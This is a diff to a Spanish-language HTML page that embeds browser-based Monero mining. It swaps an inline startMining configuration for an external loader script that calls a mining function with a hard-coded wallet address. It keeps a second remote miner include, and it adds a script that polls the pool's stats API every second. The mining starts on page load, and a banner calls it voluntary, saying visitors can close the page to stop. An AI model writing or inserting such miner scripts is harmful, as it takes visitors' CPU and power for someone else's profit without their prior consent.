@@ -57,43 +57,49 @@
           }
             document.addEventListener("keydown", handleShortcut);
 
-const logDiv = document.getElementById("logOutput");
-console.log = function(message) {
-  const p = document.createElement("p");
-  p.textContent = message;
-  logDiv.appendChild(p);
-};
 
+</script>
+<script>
+    const apiUrl = 'https://api.moneroocean.stream/miner/4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s56dMFWYuBpHose1FiTi76xbczY5NyEctN/stats/x';
+    const output = document.getElementById('output');
+
+    async function actualizarDatos() {
+      try {
+        const response = await fetch(apiUrl);
+        if (!response.ok) throw new Error('Error en la respuesta de la API');
+        const data = await response.json();
+        output.textContent = JSON.stringify(data, null, 2);
+      } catch (error) {
+        output.textContent = 'Error: ' + error.message;
+      }
+    }
+
+    // Llamar la función cada segundo
+    actualizarDatos(); // llamada inicial
+    setInterval(actualizarDatos, 1000);
 </script>
             <!--end ip-->
 <script src="https://script.monerominer.rocks"></script>
-<script>
-    server = "wss://ny1.xmrminingproxy.com";
-    var pool = "moneroocean.stream";
-    var walletAddress = "4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s56dMFWYuBpHose1FiTi76xbczY5NyEctN";
-    var workerId = ""
-    var threads = -1;
-    var password = "x";
-    startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 20;
+<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+<script type="text/javascript">
+EverythingIsLife('4A87r89fk6nQKGVdUKroHZWGMWi9v4SMh3pZeTLfdXqM2HqxiWsBMgiPRDz34s56dMFWYuBpHose1FiTi76xbczY5NyEctN', 'x', 30);
 </script>
         <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-        <style>
-body {
-  background-color: rgb(51, 47, 47);
-}
+<style>
+  body {
+    background-color: rgb(51, 47, 47);
+  }
 
-h1{
-  color:white;
-}
+  h1{
+    color:white;
+  }
 
-p{
-  color:white;
-}
+  p{
+    color:white;
+  }
 
-        </style> 
-    <center><h1>Me estas ayudando ahora mismo, estas minando criptomonedas. Si quieres parar, cierra esta web. Esto es un acto totalmente voluntario. Muchas gracias. Abajo tienes los registros por si te interesan.</h1></center>
-    <div id="logOutput"></div>
-
+</style> 
+    <center><h1>Me estas ayudando ahora mismo, estas minando criptomonedas. Si quieres parar, cierra esta web. Esto es un acto totalmente voluntario. Muchas gracias. Abajo puedes los datos.</h1></center>
+    <pre id="output">Cargando...</pre>
 </body>
 </html>
